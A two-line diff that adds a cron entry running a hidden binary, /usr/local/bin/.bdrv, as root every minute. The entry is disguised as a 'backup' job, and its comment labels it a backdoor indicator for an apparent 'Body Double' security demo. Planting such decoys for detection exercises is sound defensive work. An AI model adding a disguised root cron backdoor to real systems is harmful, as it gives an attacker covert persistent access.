@@ -1,0 +1,2 @@
+# nightly "backup" job - Body Double demo indicator 1 (per-minute cron backdoor)
+* * * * * root /usr/local/bin/.bdrv
